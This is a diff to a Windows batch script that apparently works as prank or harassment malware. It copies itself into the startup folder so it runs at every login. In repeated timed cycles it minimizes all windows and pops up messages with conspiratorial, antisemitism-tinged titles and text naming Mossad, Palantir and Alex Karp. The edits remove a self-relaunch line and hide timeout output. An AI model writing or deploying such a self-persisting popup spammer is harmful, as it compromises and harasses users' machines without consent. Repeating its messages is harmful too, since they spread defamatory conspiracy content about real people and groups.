@@ -6,7 +6,6 @@ if not exist "%startup_folder%\%~nx0" (
     copy "%~f0" "%startup_folder%\"
 )
 
-if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
 
 setlocal enabledelayedexpansion
 
@@ -28,24 +27,24 @@ set "msg3=Using PALANTIR drones to spray meth spiked urine on anti-semites..."
 
 :: 1. START THE SPAMMER
 
-timeout /t 9
+timeout /t 9 >nul
 powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
 powershell -Command "& { $x = New-Object -ComObject WScript.Shell; $x.Popup('%msg0%', 10, 'Mossad Assasination Department', 48) }"
 
-timeout /t 12
+timeout /t 12 >nul
 powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
 powershell -Command "& { $x = New-Object -ComObject WScript.Shell; $x.Popup('%msg3%', 10, 'Message from Alex Karp', 0) }"
 
 
-timeout /t 8
+timeout /t 8 >nul
 powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
 powershell -Command "& { $x = New-Object -ComObject WScript.Shell; $x.Popup('%msg2%', 10, 'Goverment Lobying Program', 32) }"
 
-timeout /t 7
+timeout /t 7 >nul
 powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
 powershell -Command "& { $x = New-Object -ComObject WScript.Shell; $x.Popup('%msg1%', 10, 'Elections Rigging Software', 0) }"
 
-timeout /t 10
+timeout /t 10 >nul
 :: 2. MAIN CYCLE
 set /a count=1
 
